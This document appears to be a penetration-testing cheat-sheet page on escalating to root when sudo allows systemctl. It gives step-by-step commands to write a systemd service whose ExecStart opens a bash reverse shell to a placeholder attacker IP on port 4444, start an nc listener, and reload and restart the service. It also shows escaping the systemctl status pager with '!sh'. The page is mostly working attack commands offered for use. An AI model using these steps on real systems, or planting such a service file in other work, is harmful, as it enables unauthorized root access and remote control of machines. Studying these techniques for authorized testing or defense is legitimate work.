---
title: Sudo Systemctl Privilege Escalation
description: sudo systemctl is vulnerable to privilege escalation by modifying the configuration file.
tags:
    - Privilege Escalation
refs:
    - https://gtfobins.github.io/gtfobins/systemctl/
date: 2023-07-12
draft: false
---

## Modify Configurations

```sh
sudo -l

(ALL) NOPASSWD: systemctl
```

If we can run **"systemctl"** command as root, and we can edit the config file, then we might be a root user.

### 1. Update the Config File

We need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.

```sh
[Unit]
This is an example service.

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

Replace **“\<local-ip\>”** with your local ip address.

### 2. Start Listener in Local Machine

Then start listener for getting a root shell.

```sh
nc -lvnp 4444
```

### 3. Restart the Service

Reload the daemon and restart.

```sh
sudo systemctl daemon-reload
sudo systemctl restart example.service
```

Now we should get a shell in local machine.

<br />

## Spawn Shell in the Pager

```bash
sudo -l

# output
(ALL) NOPASSWD: systemctl status example.service
```

If we can execute **`systemctl status`** as root, we can spawn another shell in the pager.  
Just run the command with `sudo`.

```bash
sudo systemctl status example.service
```

Then enter the following command in the pager like `less`.

```bash
!sh
```

Spawning the shell, then we can get another user shell.